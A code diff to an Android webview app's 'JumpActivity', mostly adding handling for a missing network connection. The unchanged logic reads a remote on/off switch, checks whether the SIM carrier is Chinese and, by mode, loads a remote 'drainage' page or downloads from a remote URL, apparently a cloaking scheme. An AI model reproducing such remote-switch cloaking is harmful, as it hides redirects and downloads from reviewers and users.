@@ -14,6 +14,7 @@ import com.dakulangsakalam.customwebview.presentation.ui.WebViewActivity
 import com.dakulangsakalam.customwebview.presentation.utils.DownloadTool
 import kotlinx.coroutines.ExperimentalCoroutinesApi
 import org.json.JSONException
+import java.io.IOException
 
 @ExperimentalCoroutinesApi
 abstract class JumpActivity: DownloadTool() {
@@ -34,6 +35,7 @@ abstract class JumpActivity: DownloadTool() {
                 is JumpEvent.AppInstalledEvent -> registerApplication(event.isInstalled)
                 is JumpEvent.JumpRequestSuccess -> processHandler(event.list)
                 is JumpEvent.JumpRequestError -> processHanderError(event.exception)
+                is JumpEvent.JumpNoNetwork -> noInternetPage()
                 else -> {
                     // no-op
                 }
@@ -45,9 +47,9 @@ abstract class JumpActivity: DownloadTool() {
         when(exception){
             is NullPointerException,
             is JSONException -> onStart(1, "")
+            is IOException -> noInternetPage()
             else -> onfailedRequest()
         }
-
         writeLogs("processHanderError ${exception.message}")
     }
 
@@ -60,35 +62,29 @@ abstract class JumpActivity: DownloadTool() {
     }
 
     private fun processHandler(list: JumpList) {
-
         var kaiguan = Integer.parseInt(list.off)
-
         val isChineseSim = checkOperators()
-
         val yingyongming = list.yingyongming
-
         if (!isChineseSim && !yingyongming.contains("测试")) {
             kaiguan = 1
         }
-
         val jumpDetails = JumpDetails(
             version = list.versionNumber,
             wangzhi = list.wangzhi,
             drainage = list.drainage
         )
-
         routeHandler(kaiguan, jumpDetails)
     }
 
     private fun routeHandler(kaiguan: Int, jumpDetails: JumpDetails) {
         when(kaiguan){
             0 ->  {}
-            2 -> onWebLoaded(jumpDetails.drainage ?: "")
-            3 ->  onDownload(jumpDetails.wangzhi ?: "")
+            2 -> onWebLoaded(jumpDetails.drainage)
+            3 ->  onDownload(jumpDetails.wangzhi)
             else -> onOtherResponse(
                 jumpDetails.version,
-                jumpDetails.wangzhi ?: "",
-                jumpDetails.drainage ?: ""
+                jumpDetails.wangzhi,
+                jumpDetails.drainage
             )
         }
     }
@@ -108,6 +104,7 @@ abstract class JumpActivity: DownloadTool() {
     }
 
     private fun registerApplication(installed: Boolean) {
+        writeLogs("[Register Intalled App Done!]")
         if(installed) getDefaultSharedPref().edit().putBoolean("haveInstallAddOneTimes", true).apply()
         viewModel.getApplicationUrl(getAppPackageName())
     }
@@ -129,8 +126,13 @@ abstract class JumpActivity: DownloadTool() {
 
         startLogs()
 
-        if (!isNetworkConnected()) startActivity(NoNetworkActivity.createIntent(this))
+        if (!isNetworkConnected()) noInternetPage()
         else if (!getAppIsRegistered()) startThread()
+        else viewModel.getApplicationUrl(getAppPackageName())
+    }
+
+    private fun noInternetPage() {
+        startActivity(NoNetworkActivity.createIntent(this))
     }
 
     private fun startLogs(){
